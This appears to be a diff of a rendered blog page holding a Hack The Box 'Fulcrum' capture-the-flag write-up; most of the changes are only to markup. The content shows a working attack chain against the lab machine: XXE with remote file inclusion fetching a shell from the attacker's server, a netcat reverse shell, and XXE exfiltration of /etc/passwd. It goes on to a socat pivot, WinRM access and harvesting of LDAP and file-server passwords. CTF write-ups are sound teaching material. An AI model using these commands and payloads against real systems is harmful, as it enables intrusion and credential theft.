@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Fulcrum write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -325,7 +325,7 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>).</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.62 200
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.62 200
 
 Running command: sudo masscan -e tun0 -p0-65535 --max-rate 200 --interactive 10.10.10.62
 
@@ -378,7 +378,7 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 Aggressive OS guesses: Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.13 (92%), Linux 3.2 - 4.9 (92%), Linux 4.8 (92%), Linux 4.9 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.12 (92%)
 No exact OS matches for host (test conditions non-ideal).
 Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div></div>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
 
 <h1 id="finding-an-entry-point-i-e-getting-a-shell">Finding an entry point (i.e. getting a shell)</h1>
 
@@ -391,8 +391,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div></div>
 <p>Now read this: <a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</a>. It seems that XXE on JSON endpoints are quite usual even on production systems.</p>
 
 <p>Let&rsquo;s run a webserver on our side:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python -m SimpleHTTPServer SRVPORT
-Serving HTTP on 0.0.0.0 port SRVPORT ...</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python -m SimpleHTTPServer SRVPORT
+Serving HTTP on 0.0.0.0 port SRVPORT ...</code></pre></div></p>
 
 <p>Now, if we send a POST request like that:
 <div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
@@ -411,11 +411,11 @@ Serving HTTP on 0.0.0.0 port SRVPORT ...</code></pre></div></div></p>
 
 <p>But unfortunately this will NOT run our shell.php. If only we could make it somehow to include our php file&hellip; Wait! What? Include? Inclusion? Do you remember page=home on port 4? Let&rsquo;s try it:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl http://10.10.10.62:56423/ -X POST --data-binary &#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY xxe SYSTEM &#34;http://127.0.0.1:4/index.php?page=http://SRVHOST:SRVPORT/shell&#34; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#39;</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl http://10.10.10.62:56423/ -X POST --data-binary &#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY xxe SYSTEM &#34;http://127.0.0.1:4/index.php?page=http://SRVHOST:SRVPORT/shell&#34; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#39;</code></pre></div>
 
 <p>Don&rsquo;t forget to setup our listener. Also, note that I removed the .php extension from shell.php because -as we see in the webserver requests- the .php extension is added automatically when we use the inclusion on port 4.</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60001
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nc -lvp 60001
 nc: listening on :: 60001 ...
 nc: listening on 0.0.0.0 60001 ...
 nc: connect to 10.10.15.45 60001 from fulcrum.local (10.10.10.62) 40562 [40562]
@@ -426,7 +426,7 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 bash: cannot set terminal process group (1153): Inappropriate ioctl for device
 bash: no job control in this shell
-www-data@Fulcrum:/$ </code></pre></div></div>
+www-data@Fulcrum:/$ </code></pre></div>
 
 <p>It works! For the sake of completion, note that -using XXE- we can also exfiltrate files. First, prepare a file exflt.xml which contains those lines:</p>
 
@@ -435,15 +435,15 @@ www-data@Fulcrum:/$ </code></pre></div></div>
 
 <p>Next, send a request like that:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl http://10.10.10.62:56423/ -X POST --data-binary &#39;&lt;?xml version=&#34;1.0&#34; ?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % sp SYSTEM &#34;http://SRVHOST:SRVPORT/exflt.xml&#34;&gt;%sp;%param1;]&gt;&lt;bar&gt;&amp;exfil;&lt;/bar&gt;&#39;</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl http://10.10.10.62:56423/ -X POST --data-binary &#39;&lt;?xml version=&#34;1.0&#34; ?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % sp SYSTEM &#34;http://SRVHOST:SRVPORT/exflt.xml&#34;&gt;%sp;%param1;]&gt;&lt;bar&gt;&amp;exfil;&lt;/bar&gt;&#39;</code></pre></div>
 
 <p>We will get the file contents base64-encoded back on our webserver:</p>
 
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">10.10.10.62 - - [09/Jun/2018 16:58:36] &#34;GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKbHhkOng6MTA2OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKZG5zbWFzcTp4OjEwNzo2NTUzNDpkbnNtYXNxLCwsOi92YXIvbGliL21pc2M6L2Jpbi9mYWxzZQptZXNzYWdlYnVzOng6MTA4OjExMTo6L3Zhci9ydW4vZGJ1czovYmluL2ZhbHNlCmJsdWVwcmludDp4OjEwMDA6MTAwMDpibHVlcHJpbnQsLCw6L2hvbWUvYmx1ZXByaW50Oi9iaW4vYmFzaApjb2xvcmQ6eDoxMDk6MTE3OmNvbG9yZCBjb2xvdXIgbWFuYWdlbWVudCBkYWVtb24sLCw6L3Zhci9saWIvY29sb3JkOi9iaW4vZmFsc2UKbGlidmlydC1xZW11Ong6NjQwNTU6MTE1OkxpYnZpcnQgUWVtdSwsLDovdmFyL2xpYi9saWJ2aXJ0Oi9iaW4vZmFsc2UKbGlidmlydC1kbnNtYXNxOng6MTEwOjExODpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi9iaW4vZmFsc2UKc3NoZDp4OjExMTo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.0&#34; 404</code></pre></div>
 
 <p>Here is the index.php on port 4 for reference:
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">www-data@Fulcrum:~$ cat /var/www/uploads/index.php
-<span class="cp">&lt;?php</span>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">Fulcrum</span><span class="o">:~</span><span class="err">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">uploads</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">)</span>
 <span class="p">{</span>
 	<span class="k">echo</span> <span class="s2">&#34;&lt;h1&gt;Under Maintance&lt;/h1&gt;&lt;p&gt;Please &lt;a href=</span><span class="se">\&#34;</span><span class="s2">http://&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;:4/index.php?page=home</span><span class="se">\&#34;</span><span class="s2">&gt;try again&lt;/a&gt; later.&lt;/p&gt;&#34;</span><span class="p">;</span>
@@ -451,12 +451,12 @@ www-data@Fulcrum:/$ </code></pre></div></div>
 	<span class="nv">$inc</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;page&#34;</span><span class="p">];</span>
 	<span class="k">include</span><span class="p">(</span><span class="nv">$inc</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
 <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></div></p>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div></p>
 
 <p>Here is the index.php on port 56423 for reference:
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">www-data@Fulcrum:~$ cat /var/www/api/index.php
-<span class="cp">&lt;?php</span>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">Fulcrum</span><span class="o">:~</span><span class="err">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">api</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
         <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type:application/json;charset=utf-8&#39;</span><span class="p">);</span>
         <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Server: Fulcrum-API Beta&#39;</span><span class="p">);</span>
         <span class="nx">libxml_disable_entity_loader</span> <span class="p">(</span><span class="k">false</span><span class="p">);</span>
@@ -473,14 +473,14 @@ www-data@Fulcrum:/$ </code></pre></div></div>
                 <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Heartbeat&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Ping&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;Pong&#34;</span><span class="p">));</span>
         <span class="p">}</span>
         <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
-<span class="cp">?&gt;</span>
-</code></pre></div></p>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div></p>
 
 <h2 id="getting-shell-on-the-webserver-as-webuser">Getting shell on the webserver as WebUser</h2>
 
 <p>There is an interesting powershell script in /var/www/uploads/Fulcrum_Upload_to_Corp.ps1:</p>
 
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">www-data</span><span class="nv">@Fulcrum</span><span class="err">:</span><span class="p">~$</span> <span class="n">cat</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">uploads</span><span class="p">/</span><span class="n">Fulcrum_Upload_to_Corp</span><span class="p">.</span><span class="n">ps1</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">www-data</span><span class="nv">@Fulcrum</span><span class="err">:</span><span class="p">~$</span> <span class="nb">cat </span><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">uploads</span><span class="p">/</span><span class="n">Fulcrum_Upload_to_Corp</span><span class="p">.</span><span class="n">ps1</span>
 <span class="c"># TODO: Forward the PowerShell remoting port to the external interface</span>
 <span class="c"># Password is now encrypted \o/</span>
 
@@ -502,16 +502,16 @@ If we run the above script code we can retrieve the password like this:</p>
 
 <p>Now, we know those credentials WebUser:M4ng£m£ntPa55. If we look the file /etc/nginx/sites-enabled/default, we discover an interesting IP address: 192.168.122.228. This IP has port 5986 open (WS-Management a.k.a. WinRM a.k.a PowerShell Remoting). So, let&rsquo;s redirect the port 5986 of 192.168.122.228 to the port 60217 of 10.10.10.62. Then we can access it from outside. I prefer to use socat for this job (you can find it here: <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" target="_blank">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat</a>).</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@Fulcrum:/$ mkdir /dev/shm/.a
+<div class="bg-black"><pre><code class="language-console" data-lang="console">www-data@Fulcrum:/$ mkdir /dev/shm/.a
 www-data@Fulcrum:/$ cd /dev/shm/.a
 www-data@Fulcrum:/dev/shm/.a$ wget http://SRVHOST:SRVPORT/socat
 www-data@Fulcrum:/dev/shm/.a$ chmod +x socat
-www-data@Fulcrum:/dev/shm/.a$ ./socat tcp-listen:60217,reuseaddr,fork tcp:192.168.122.228:5986 &amp;</code></pre></div></div>
+www-data@Fulcrum:/dev/shm/.a$ ./socat tcp-listen:60217,reuseaddr,fork tcp:192.168.122.228:5986 &amp;</code></pre></div>
 
 <p>Now, we can use either Windows Powershell to connect or Ruby&rsquo;s winrm module. To connect from a windows box via my linux system I do a second port redirection like this:</p>
 
 <p>On my linux system I run:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:60217</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:60217</code></pre></div></p>
 
 <p>On my windows powershell I run:</p>
 
@@ -528,21 +528,21 @@ www-data@Fulcrum:/dev/shm/.a$ ./socat tcp-listen:60217,reuseaddr,fork tcp:192.16
   <span class="ss">:no_ssl_peer_verification</span> <span class="o">=&gt;</span> <span class="kp">true</span>
 <span class="p">)</span></code></pre></div></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ruby winrm_shell_with_upload.rb
-PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ruby winrm_shell_with_upload.rb
+PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div>
 
 <h1 id="getting-ldap-credentials">Getting LDAP credentials</h1>
 
 <p>The file C:\Inetpub\wwwroot\web.config contains some credentials:</p>
 
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="no">[System.Net.Dns]</span><span class="p">::</span><span class="n">GetHostByName</span><span class="p">((</span><span class="nv">$env:computerName</span><span class="p">))</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="no">[System.Net.Dns]</span><span class="p">::</span><span class="n">GetHostByName</span><span class="p">((</span><span class="nv">$env:computerName</span><span class="p">))</span>
 
 <span class="n">HostName</span>  <span class="n">Aliases</span> <span class="n">AddressList</span>   
 <span class="p">--------</span>  <span class="p">-------</span> <span class="p">-----------</span>   
 <span class="n">WebServer</span> <span class="p">{}</span>      <span class="p">{</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">55</span><span class="p">.</span><span class="n">2</span><span class="p">}</span>
 
-<span class="n">PS</span> <span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cd</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Inetpub</span><span class="p">\</span><span class="n">wwwroot</span>
-<span class="n">PS</span> <span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">wwwroot</span><span class="p">&gt;</span> <span class="n">cat</span> <span class="n">web</span><span class="p">.</span><span class="n">config</span>
+<span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="n">C:</span><span class="p">\</span><span class="n">Inetpub</span><span class="p">\</span><span class="n">wwwroot</span>
+<span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">wwwroot</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">web</span><span class="p">.</span><span class="n">config</span>
 <span class="p">...</span>
  <span class="n">connectionUsername</span><span class="p">=</span><span class="s2">&#34;FULCRUM\LDAP&#34;</span> <span class="n">connectionPassword</span><span class="p">=</span><span class="s2">&#34;PasswordForSearching123!&#34;</span>
 <span class="p">...</span></code></pre></div></div>
@@ -551,7 +551,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 
 <p>Let&rsquo;s see what computers we know using an LDAP query:</p>
 
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(objectCategory=Computer)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">.</span><span class="n">name</span> <span class="p">}</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(objectCategory=Computer)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">.</span><span class="n">name</span> <span class="p">}</span>
 
 <span class="n">Path</span>                                                                    <span class="n">Properties</span>
 <span class="p">----</span>                                                                    <span class="p">----------</span>
@@ -559,7 +559,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 <span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">FILE</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>        <span class="p">{</span><span class="n">logoncount</span><span class="p">,</span> <span class="n">codepage</span><span class="p">,</span> <span class="n">objectcategory</span><span class="p">,</span> <span class="n">iscriticalsystemobject</span><span class="p">...}</span></code></pre></div></div>
 
 <p>We see two CNs: DC and FILE. Now let&rsquo;s query about info:
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(info=*)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span> <span class="p">}</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(info=*)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span> <span class="p">}</span>
 
 <span class="n">Name</span>                           <span class="n">Value</span>
 <span class="p">----</span>                           <span class="p">-----</span>
@@ -578,7 +578,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 <span class="n">lastlogontimestamp</span>             <span class="p">{</span><span class="n">131556801131693417</span><span class="p">}</span>
 <span class="n">usncreated</span>                     <span class="p">{</span><span class="n">12878</span><span class="p">}</span>
 <span class="n">objectguid</span>                     <span class="p">{</span><span class="n">88</span> <span class="n">53</span> <span class="n">29</span> <span class="n">79</span> <span class="n">114</span> <span class="n">147</span> <span class="n">100</span> <span class="n">75</span> <span class="n">187</span> <span class="n">41</span> <span class="n">125</span> <span class="n">239</span> <span class="n">148</span> <span class="n">113</span> <span class="n">13</span> <span class="n">111</span><span class="p">}</span>
-<span class="n">info</span>                           <span class="p">{</span><span class="n">Password</span> <span class="n">set</span> <span class="n">to</span> <span class="p">++</span><span class="n">FileServerLogon12345</span><span class="p">++}</span>
+<span class="n">info</span>                           <span class="p">{</span><span class="n">Password</span> <span class="nb">set </span><span class="n">to</span> <span class="p">++</span><span class="n">FileServerLogon12345</span><span class="p">++}</span>
 <span class="n">whencreated</span>                    <span class="p">{</span><span class="n">10</span><span class="p">/</span><span class="n">2</span><span class="p">/</span><span class="n">2017</span> <span class="n">6</span><span class="err">:</span><span class="n">06</span><span class="err">:</span><span class="n">57</span> <span class="n">PM</span><span class="p">}</span>
 <span class="n">adspath</span>                        <span class="p">{</span><span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">Bobby</span> <span class="n">Tables</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">People</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="p">}</span>
 <span class="n">useraccountcontrol</span>             <span class="p">{</span><span class="n">66048</span><span class="p">}</span>
@@ -597,7 +597,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 <span class="n">userprincipalname</span>              <span class="p">{</span><span class="n">BTables</span><span class="nv">@fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">}</span></code></pre></div></div></p>
 
 <p>Bingo! We have found some credentials (fulcrum.local\btables:++FileServerLogon12345++) for the file server:
